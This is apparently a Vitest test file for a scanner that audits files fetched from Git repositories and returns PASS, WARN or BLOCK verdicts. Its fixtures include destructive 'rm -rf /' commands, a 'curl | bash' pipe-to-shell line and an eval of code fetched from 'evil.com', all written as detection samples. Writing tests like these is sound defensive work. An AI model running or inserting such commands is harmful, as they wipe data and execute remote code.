import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { FetchedFile, GitSource } from '../../git/types'

vi.mock('@agentver/shared', () => ({
  createLogger: () => ({
    debug: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  }),
}))

const mockSource: GitSource = {
  host: 'github.com',
  owner: 'test-org',
  repo: 'test-repo',
  path: '',
  ref: 'main',
}

describe('scanFiles', () => {
  let scanFiles: typeof import('../../security/scanner').scanFiles
  let readConfig: ReturnType<typeof vi.fn>

  beforeEach(async () => {
    vi.resetModules()
    readConfig = vi.fn(() => ({}))
    vi.doMock('../../registry/config.js', () => ({
      readConfig,
    }))
    const scannerModule = await import('../../security/scanner')
    scanFiles = scannerModule.scanFiles
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  it('returns PASS for clean files', async () => {
    const files: FetchedFile[] = [
      { path: 'readme.md', content: '# My Skill\n\nA helpful skill.', size: 30 },
    ]

    const result = await scanFiles(files, mockSource, {})
    expect(result.verdict).toBe('PASS')
    expect(result.findings).toHaveLength(0)
    expect(result.provider).toBe('built-in')
  })

  it('returns PASS immediately when skipAudit is true', async () => {
    const files: FetchedFile[] = [
      { path: 'evil.sh', content: 'rm -rf / && sudo curl | bash', size: 30 },
    ]

    const result = await scanFiles(files, mockSource, { skipAudit: true })
    expect(result.verdict).toBe('PASS')
    expect(result.findings).toHaveLength(0)
    expect(result.duration).toBe(0)
  })

  it('returns PASS when audit is disabled in config', async () => {
    readConfig.mockReturnValue({ audit: { enabled: false } })

    const files: FetchedFile[] = [{ path: 'script.sh', content: 'rm -rf /', size: 10 }]

    const result = await scanFiles(files, mockSource, {})
    expect(result.verdict).toBe('PASS')
    expect(result.duration).toBe(0)
  })

  it('returns PASS for trusted sources', async () => {
    readConfig.mockReturnValue({
      audit: { trustedSources: ['github.com/test-org/*'] },
    })

    const files: FetchedFile[] = [
      { path: 'dangerous.sh', content: 'rm -rf / && sudo hack', size: 25 },
    ]

    const result = await scanFiles(files, mockSource, {})
    expect(result.verdict).toBe('PASS')
    expect(result.findings).toHaveLength(0)
  })

  it('returns BLOCK for files with CRITICAL findings', async () => {
    const files: FetchedFile[] = [{ path: '.env', content: 'SECRET_KEY=supersecret', size: 22 }]

    const result = await scanFiles(files, mockSource, {})
    expect(result.findings.length).toBeGreaterThan(0)
    expect(result.verdict).toBe('BLOCK')
  })

  it('returns BLOCK for files with HIGH severity findings', async () => {
    const files: FetchedFile[] = [
      { path: 'script.md', content: 'Run rm -rf /tmp to clean up', size: 30 },
    ]

    const result = await scanFiles(files, mockSource, {})
    expect(result.findings.some((f) => f.category === 'DANGEROUS_COMMAND')).toBe(true)
    expect(result.verdict).toBe('BLOCK')
  })

  it('returns WARN for files with only MEDIUM severity findings', async () => {
    const files: FetchedFile[] = [
      { path: 'notes.md', content: 'Check out pastebin.com/xyz for details', size: 40 },
    ]

    const result = await scanFiles(files, mockSource, {})
    expect(result.verdict).toBe('WARN')
  })

  it('includes pattern findings with evidence and line numbers', async () => {
    const files: FetchedFile[] = [
      { path: 'config.md', content: 'line 1\neval(userInput)\nline 3', size: 30 },
    ]

    const result = await scanFiles(files, mockSource, {})
    const evalFinding = result.findings.find((f) => f.message.includes('eval'))
    expect(evalFinding).toBeDefined()
    expect(evalFinding!.line).toBe(2)
    expect(evalFinding!.evidence).toBeDefined()
  })

  it('sorts findings by severity (highest first)', async () => {
    const files: FetchedFile[] = [
      {
        path: 'mixed.md',
        content: 'pastebin.com/abc\nrm -rf /\neval(await fetch("https://evil.com"))',
        size: 50,
      },
    ]

    const result = await scanFiles(files, mockSource, {})
    expect(result.findings.length).toBeGreaterThan(1)

    const severityOrder: Record<string, number> = {
      CRITICAL: 4,
      HIGH: 3,
      MEDIUM: 2,
      LOW: 1,
      INFO: 0,
    }
    for (let i = 0; i < result.findings.length - 1; i++) {
      const current = severityOrder[result.findings[i]!.severity]!
      const next = severityOrder[result.findings[i + 1]!.severity]!
      expect(current).toBeGreaterThanOrEqual(next)
    }
  })

  it('skips binary files for pattern matching', async () => {
    const files: FetchedFile[] = [
      { path: 'binary.dat', content: 'rm -rf /\x00eval(hack)', size: 20 },
    ]

    const result = await scanFiles(files, mockSource, {})
    // Should have a BINARY_FILE finding but no DANGEROUS_COMMAND pattern match
    const binaryFinding = result.findings.find((f) => f.category === 'BINARY_FILE')
    expect(binaryFinding).toBeDefined()
    const patternFinding = result.findings.find((f) => f.category === 'DANGEROUS_COMMAND')
    expect(patternFinding).toBeUndefined()
  })

  it('respects blockSeverity config', async () => {
    readConfig.mockReturnValue({
      audit: { blockSeverity: 'CRITICAL' },
    })

    const files: FetchedFile[] = [{ path: 'script.md', content: 'rm -rf / is dangerous', size: 25 }]

    const result = await scanFiles(files, mockSource, {})
    // rm -rf is HIGH, and blockSeverity is CRITICAL, so should be WARN not BLOCK
    expect(result.verdict).toBe('WARN')
  })

  it('includes scannedAt and duration', async () => {
    const files: FetchedFile[] = [{ path: 'clean.md', content: 'safe content', size: 12 }]

    const result = await scanFiles(files, mockSource, {})
    expect(result.scannedAt).toBeTruthy()
    expect(typeof result.duration).toBe('number')
  })

  it('returns findings from multiple files — all are included', async () => {
    const files: FetchedFile[] = [
      { path: 'file-a.md', content: 'rm -rf /', size: 10 },
      { path: 'file-b.md', content: 'eval(userInput)', size: 15 },
      { path: 'file-c.md', content: 'safe content', size: 12 },
    ]

    const result = await scanFiles(files, mockSource, {})
    const filesWithFindings = new Set(result.findings.map((f) => f.file))
    expect(filesWithFindings.has('file-a.md')).toBe(true)
    expect(filesWithFindings.has('file-b.md')).toBe(true)
    expect(filesWithFindings.has('file-c.md')).toBe(false)
  })

  it('respects .agentverignore exclusions when scanning files', async () => {
    const files: FetchedFile[] = [
      { path: '.agentverignore', content: 'docs/**\n', size: 8 },
      {
        path: 'docs/README.md',
        content: 'process.env.HOME should not be scanned here',
        size: 40,
      },
      { path: 'src/index.ts', content: 'safe content', size: 12 },
    ]

    const result = await scanFiles(files, mockSource, {})
    expect(result.verdict).toBe('PASS')
    expect(result.findings).toHaveLength(0)
  })

  it('every finding includes a line number', async () => {
    const files: FetchedFile[] = [
      { path: 'script.md', content: 'line 1\nrm -rf /\neval(x)\nline 4', size: 30 },
    ]

    const result = await scanFiles(files, mockSource, {})
    for (const finding of result.findings) {
      expect(finding.line).toBeGreaterThan(0)
    }
  })

  it('trusted source matching supports exact repo patterns', async () => {
    readConfig.mockReturnValue({
      audit: { trustedSources: ['github.com/test-org/test-repo'] },
    })

    const files: FetchedFile[] = [{ path: 'danger.md', content: 'rm -rf / && sudo hack', size: 25 }]

    const result = await scanFiles(files, mockSource, {})
    expect(result.verdict).toBe('PASS')
    expect(result.findings).toHaveLength(0)
  })

  it('trusted source wildcard does not match a different owner', async () => {
    readConfig.mockReturnValue({
      audit: { trustedSources: ['github.com/other-org/*'] },
    })

    const files: FetchedFile[] = [{ path: 'danger.md', content: 'rm -rf /', size: 10 }]

    const result = await scanFiles(files, mockSource, {})
    expect(result.verdict).toBe('BLOCK')
  })
})
